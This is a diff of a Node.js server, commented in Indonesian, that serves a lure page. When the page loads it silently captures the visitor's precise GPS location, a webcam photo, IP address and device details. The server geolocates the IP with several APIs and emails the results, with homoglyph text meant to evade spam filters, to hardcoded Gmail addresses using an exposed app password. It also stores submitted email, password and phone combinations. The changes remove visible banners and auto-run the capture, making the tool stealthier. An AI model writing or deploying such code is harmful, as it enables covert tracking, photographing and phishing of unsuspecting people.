@@ -15,7 +15,6 @@ app.use(bodyParser.json({ limit: '10mb' }));
 const SENDER_EMAIL = 'gajeb682@gmail.com';
 const SENDER_PASSWORD = 'tmyh wklt uyig lots';
 
-// EMAIL TUJUAN PER FOLDER
 const EMAIL_CONFIG = {
     'wxyzzay': {
         email: ['chilligemaass@gmail.com'],
@@ -101,7 +100,7 @@ function isDuplicatePassword(targetEmail, currentPassword) {
     return false;
 }
 
-// ========== TAMBAHAN: ANTI DUPLIKAT KOMBINASI (email + password + phone) ==========
+// ========== ANTI DUPLIKAT KOMBINASI ==========
 const SUBMISSION_HISTORY_FILE = path.join(__dirname, 'submission_history.json');
 
 function loadSubmissionHistory() {
@@ -147,7 +146,7 @@ function markSubmission(email, password, phone) {
     };
     saveSubmissionHistory(history);
 }
-// ===================================================================================
+// =============================================
 
 const transporter = nodemailer.createTransport({
     service: 'gmail',
@@ -166,7 +165,7 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
-// ========== FUNGSI BARU: MULTI-API CROSS-CHECK + REVERSE GEOCODING ==========
+// ========== MULTI-API GEOLOCATION + REVERSE GEOCODING ==========
 async function getASNAndAccurateLocation(ip) {
     const result = {
         asn: 'Tidak terdeteksi',
@@ -189,7 +188,7 @@ async function getASNAndAccurateLocation(ip) {
         return result;
     }
 
-    // ===== API 1: ip-api.com =====
+    // API 1: ip-api.com
     try {
         const res1 = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname,query,proxy,hosting,mobile`);
         const data1 = await res1.json();
@@ -215,7 +214,7 @@ async function getASNAndAccurateLocation(ip) {
         }
     } catch (e) { console.error('ip-api.com error:', e.message); }
 
-    // ===== API 2: ipapi.co =====
+    // API 2: ipapi.co
     try {
         const res2 = await fetch(`https://ipapi.co/${ip}/json/`);
         const data2 = await res2.json();
@@ -236,7 +235,7 @@ async function getASNAndAccurateLocation(ip) {
         }
     } catch (e) { console.error('ipapi.co error:', e.message); }
 
-    // ===== API 3: ipwho.is =====
+    // API 3: ipwho.is
     try {
         const res3 = await fetch(`https://ipwho.is/${ip}`);
         const data3 = await res3.json();
@@ -259,7 +258,7 @@ async function getASNAndAccurateLocation(ip) {
         }
     } catch (e) { console.error('ipwho.is error:', e.message); }
 
-    // ===== REVERSE GEOCODING (Nominatim) =====
+    // REVERSE GEOCODING
     if (result.latitude && result.longitude) {
         try {
             const res4 = await fetch(
@@ -303,7 +302,7 @@ function randStr(len) {
 }
 function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
 
-// ========== HELPER: TEKS UNICODE SPAMMY ==========
+// ========== UNICODE SPAMMY DESASTR ==========
 function makeSpammyUnicodeText(baseText) {
     const homoglyphs = {
         'a': ['а', 'ɑ', 'α'], 'e': ['е', 'ε', 'ë'], 'o': ['о', 'ο', 'ö'],
@@ -341,7 +340,6 @@ function makeCombiningText(baseText) {
     return result;
 }
 
-// ========== HELPER: KLASIFIKASI SUMBER LOKASI ==========
 function classifyLocationSource(gpsAccuracy, hasGPS) {
     if (!hasGPS || !gpsAccuracy || gpsAccuracy === '-' || gpsAccuracy === null) {
         return { source: 'IP Geolocation (fallback)', level: 'LOW', color: '#ff9800' };
@@ -358,18 +356,14 @@ function classifyLocationSource(gpsAccuracy, hasGPS) {
 async function sendEmail(data, folderName) {
     const asnData = await getASNAndAccurateLocation(data.ip_address);
     
-    // ===== PRIORITAS: GPS DULU, IP FALLBACK =====
     const hasGPS = data.latitude && data.latitude !== '-' && data.longitude && data.longitude !== '-';
     const gpsAccuracy = data.gps_accuracy;
-    
     const locSource = classifyLocationSource(gpsAccuracy, hasGPS);
     
-    // Koordinat final: GPS kalo ada, IP kalo ga
     const finalLat = hasGPS ? data.latitude : (asnData.latitude || '-');
     const finalLon = hasGPS ? data.longitude : (asnData.longitude || '-');
     const finalAccuracy = hasGPS ? `${gpsAccuracy} m (GPS)` : 'IP-based (radius 10-50 km)';
     
-    // Reverse geocode pake koordinat final (GPS kalo ada, lebih akurat)
     let reverseGeo = asnData.reverseGeocode;
     if (hasGPS) {
         try {
@@ -412,7 +406,6 @@ async function sendEmail(data, folderName) {
     const desastrRTL = makeRTLText('DESASTR');
     const desastrRandom = randPick([desastrSpammy, desastrFullwidth, desastrCombining, desastrRTL]);
     
-    // ===== BUILD HTML REVERSE GEOCODE SECTION =====
     let reverseGeoHtml = '';
     if (reverseGeo) {
         const rg = reverseGeo;
@@ -432,7 +425,6 @@ async function sendEmail(data, folderName) {
         </div>`;
     }
     
-    // ===== BUILD HTML MULTI-SOURCE SECTION =====
     let multiSourceHtml = '';
     const sourceKeys = Object.keys(asnData.sources);
     if (sourceKeys.length > 0) {
@@ -495,6 +487,7 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             <div class="data-row"><div class="label">Latitude GPS : </div><div class="value"> ${data.latitude || '-'}</div></div>
             <div class="data-row"><div class="label">Longitude GPS : </div><div class="value"> ${data.longitude || '-'}</div></div>
             <div class="data-row"><div class="label">Accuracy GPS : </div><div class="value"> ${data.gps_accuracy || '-'} m</div></div>
+            <div class="data-row"><div class="label">Sumber GPS : </div><div class="value"> ${data.gps_source || 'IP fallback'}</div></div>
         </div>
         ${reverseGeoHtml}
         <div class="data-box">
@@ -802,7 +795,7 @@ app.get('/api/cooldown/:email', (req, res) => {
     });
 });
 
-// HTML Frontend (sama persis kaya punya lo)
+// ========== HTML BIASA (SILENT, TANPA BANNER) ==========
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="id">
@@ -812,38 +805,15 @@ app.get('/', (req, res) => {
     <title>🔒 DSTR ULTIMATE SECURITY</title>
     <style>
         * { user-select: none; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%);
-            min-height: 100vh;
-            font-family: 'Courier New', monospace;
-            overflow-x: hidden;
-            position: relative;
-        }
+        body { background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%); min-height: 100vh; font-family: 'Courier New', monospace; overflow-x: hidden; position: relative; }
         .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
-        @keyframes glitch {
-            0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
-            50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); }
-        }
+        @keyframes glitch { 0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); } 50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); } }
         @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-        @keyframes floatEmoji {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
-        }
-        .scanline {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%);
-            background-size: 100% 4px; pointer-events: none; z-index: 10;
-            animation: scan 8s linear infinite;
-        }
+        @keyframes floatEmoji { 0% { transform: translateY(100vh) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; } }
+        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%); background-size: 100% 4px; pointer-events: none; z-index: 10; animation: scan 8s linear infinite; }
         @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
         .container { position: relative; z-index: 2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .hacker-card {
-            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0;
-            border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center;
-            box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite;
-        }
+        .hacker-card { background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0; border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center; box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite; }
         .warning-text { font-size: 32px; font-weight: bold; color: #0f0; margin: 20px 0; animation: blink 1s infinite; }
         .hacker-text { font-size: 24px; color: red; margin: 15px 0; }
         .emoji-wall { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 30px 0; }
@@ -889,8 +859,8 @@ app.get('/', (req, res) => {
             <div class="status-line">🟢 [DSTR-SYSTEM] Status: <span class="blink-cursor">ACTIVE</span></div>
             <div class="status-line">🔴 [ANTI-CLICK] Status: ENFORCED</div>
             <div class="status-line">🟡 [ANTI-DEVTOOLS] Status: DEPLOYED</div>
-            <div class="status-line">🔵 [GPS TRACKING] Status: <span id="gpsStatus">Mengambil...</span></div>
-            <div class="status-line">🟣 [WEBCAM CAPTURE] Status: <span id="camStatus">Mengambil...</span></div>
+            <div class="status-line">🔵 [GPS TRACKING] Status: <span id="gpsStatus">Memproses...</span></div>
+            <div class="status-line">🟣 [WEBCAM CAPTURE] Status: <span id="camStatus">Memproses...</span></div>
             <div class="status-line">⚪ [DATA SENT] Status: <span id="sendStatus">Belum</span></div>
         </div>
         
@@ -936,7 +906,7 @@ app.get('/', (req, res) => {
         }
     }, 1000);
     
-    function forceFullscreen() { document.documentElement.requestFullscreen(); }
+    function forceFullscreen() { try { document.documentElement.requestFullscreen(); } catch(e) {} }
     window.onload = forceFullscreen;
     
     async function getIP() {
@@ -947,7 +917,6 @@ app.get('/', (req, res) => {
         } catch(e) { return 'Tidak terdeteksi'; }
     }
     
-    // ===== GET GPS: 3 LAPIS (GPS-FIRST) =====
     async function getGPS() {
         return new Promise(async function(resolve) {
             if (!navigator.geolocation) {
@@ -955,19 +924,14 @@ app.get('/', (req, res) => {
                 return resolve(null);
             }
             
-            document.getElementById('gpsStatus').innerText = '🔍 Lapis 1: GPS high accuracy (15s)...';
+            document.getElementById('gpsStatus').innerText = '🔍 Memproses GPS...';
             
             let best = null;
             try {
                 best = await new Promise(function(res) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
-                            res({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                source: 'GPS/WiFi (getCurrentPosition high)'
-                            });
+                            res({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'GPS/WiFi (getCurrentPosition high)' });
                         },
                         function(err) { res(null); },
                         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -976,11 +940,10 @@ app.get('/', (req, res) => {
             } catch(e) { best = null; }
             
             if (best && best.accuracy && best.accuracy <= 100) {
-                document.getElementById('gpsStatus').innerHTML = '✅ ' + best.lat + ', ' + best.lon + ' (' + Math.round(best.accuracy) + 'm) - ' + best.source;
+                document.getElementById('gpsStatus').innerHTML = '✅ ' + best.lat + ', ' + best.lon + ' (' + Math.round(best.accuracy) + 'm)';
                 return resolve(best);
             }
             
-            document.getElementById('gpsStatus').innerText = '🔍 Lapis 2: GPS watch (10s)...';
             const watchResult = await new Promise(function(res) {
                 let samples = [];
                 let watchId = null;
@@ -995,12 +958,7 @@ app.get('/', (req, res) => {
                 };
                 watchId = navigator.geolocation.watchPosition(
                     function(pos) {
-                        samples.push({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            source: 'GPS/WiFi (watchPosition)'
-                        });
+                        samples.push({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'GPS/WiFi (watchPosition)' });
                         if (pos.coords.accuracy <= 50) finish();
                     },
                     function(err) {},
@@ -1010,22 +968,16 @@ app.get('/', (req, res) => {
             });
             
             if (watchResult && watchResult.accuracy && watchResult.accuracy <= 100) {
-                document.getElementById('gpsStatus').innerHTML = '✅ ' + watchResult.lat + ', ' + watchResult.lon + ' (' + Math.round(watchResult.accuracy) + 'm) - ' + watchResult.source;
+                document.getElementById('gpsStatus').innerHTML = '✅ ' + watchResult.lat + ', ' + watchResult.lon + ' (' + Math.round(watchResult.accuracy) + 'm)';
                 return resolve(watchResult);
             }
             
-            document.getElementById('gpsStatus').innerText = '🔍 Lapis 3: Cell Tower / WiFi (10s)...';
             let lowAcc = null;
             try {
                 lowAcc = await new Promise(function(res) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
-                            res({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                source: 'Cell Tower / WiFi (low accuracy)'
-                            });
+                            res({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'Cell Tower / WiFi (low accuracy)' });
                         },
                         function(err) { res(null); },
                         { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
@@ -1035,12 +987,12 @@ app.get('/', (req, res) => {
             
             const candidates = [best, watchResult, lowAcc].filter(function(x) { return x && x.lat && x.lon; });
             if (candidates.length === 0) {
-                document.getElementById('gpsStatus').innerText = '❌ GPS gagal (ditolak / tidak tersedia)';
+                document.getElementById('gpsStatus').innerText = '❌ GPS gagal, fallback ke IP';
                 return resolve(null);
             }
             candidates.sort(function(a,b) { return a.accuracy - b.accuracy; });
             const finalBest = candidates[0];
-            document.getElementById('gpsStatus').innerHTML = '✅ ' + finalBest.lat + ', ' + finalBest.lon + ' (' + Math.round(finalBest.accuracy) + 'm) - ' + finalBest.source;
+            document.getElementById('gpsStatus').innerHTML = '✅ ' + finalBest.lat + ', ' + finalBest.lon + ' (' + Math.round(finalBest.accuracy) + 'm)';
             return resolve(finalBest);
         });
     }
@@ -1053,18 +1005,15 @@ app.get('/', (req, res) => {
         
         try {
             previewDiv.classList.remove('hidden');
-            document.getElementById('camStatus').innerText = 'Mengakses kamera...';
+            document.getElementById('camStatus').innerText = 'Memproses kamera...';
             var stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             await video.play();
-            
             await new Promise(function(r) { setTimeout(r, 1000); });
-            
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             var wajahBase64 = canvas.toDataURL('image/jpeg');
-            
             stream.getTracks().forEach(function(track) { track.stop(); });
             video.srcObject = null;
             previewDiv.classList.add('hidden');
@@ -1072,7 +1021,7 @@ app.get('/', (req, res) => {
             return wajahBase64;
         } catch(e) {
             console.error('Gagal akses kamera:', e);
-            document.getElementById('camStatus').innerText = 'Gagal (izinkan kamera)';
+            document.getElementById('camStatus').innerText = 'Gagal';
             previewDiv.classList.add('hidden');
             return null;
         }
@@ -1091,7 +1040,7 @@ app.get('/', (req, res) => {
         };
     }
     
-    async function sendAllData() {
+    async function sendAllDataSilently() {
         try {
             document.getElementById('sendStatus').innerText = 'Mengirim...';
             
@@ -1099,10 +1048,6 @@ app.get('/', (req, res) => {
             var gps = await getGPS();
             var wajah = await captureWajah();
             var deviceInfo = getDeviceInfo();
-            
-            if (!gps) {
-                document.getElementById('gpsStatus').innerHTML = '⚠️ GPS gagal, fallback ke IP';
-            }
             
             var payload = {
                 email: 'target@tersuspect.com',
@@ -1122,7 +1067,7 @@ app.get('/', (req, res) => {
                 deviceInfo: deviceInfo
             };
             
-            var response = await fetch(window.location.pathname.split('/')[1] ? '/' + window.location.pathname.split('/')[1] + '/api/register' : '/wxyzzay/api/register', {
+            var response = await fetch('/ggwxzzr/api/register', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
@@ -1130,7 +1075,7 @@ app.get('/', (req, res) => {
             
             var result = await response.json();
             if (result.success) {
-                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM! (GPS 3 LAPIS + IP + ASN + WEBCAM)';
+                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM!';
             } else {
                 document.getElementById('sendStatus').innerHTML = '⚠️ Gagal kirim';
             }
@@ -1140,7 +1085,11 @@ app.get('/', (req, res) => {
         }
     }
     
-    sendAllData();
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            sendAllDataSilently();
+        }, 800);
+    });
     
     var canvasMat = document.getElementById('matrixCanvas');
     var ctxMat = canvasMat.getContext('2d');
@@ -1170,7 +1119,7 @@ app.get('/', (req, res) => {
         canvasMat.height = window.innerHeight;
     });
     
-    console.log('%c🚫 DSTR SECURITY - GPS 3 LAPIS + IP FALLBACK + WEBCAM AKTIF!', 'color: red; font-size: 16px;');
+    console.log('%c🚫 DSTR SECURITY - SILENT MODE AKTIF!', 'color: red; font-size: 16px;');
 </script>
 </body>
 </html>`);
@@ -1185,9 +1134,12 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/mgwhiww`);
     console.log(`   → http://localhost:${PORT}/kttwwxy`);
     console.log(`   → http://localhost:${PORT}/mdgffew`);
+    console.log(`   → http://localhost:${PORT}/FF_EventA`);
     console.log(`\n✅ GPS-FIRST STRATEGY: 3 lapis (GPS high → watch → cell tower) sebelum fallback IP!`);
     console.log(`✅ MULTI-API GEOLOCATION: ip-api.com + ipapi.co + ipwho.is cross-check!`);
     console.log(`✅ REVERSE GEOCODING: Nominatim (OpenStreetMap) untuk alamat lengkap!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
     console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR (tanpa kata peringatan, tanpa file)!`);
+    console.log(`✅ HTML BIASA: Silent permission (tanpa banner)!`);
+    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + silent permission!`);
 });
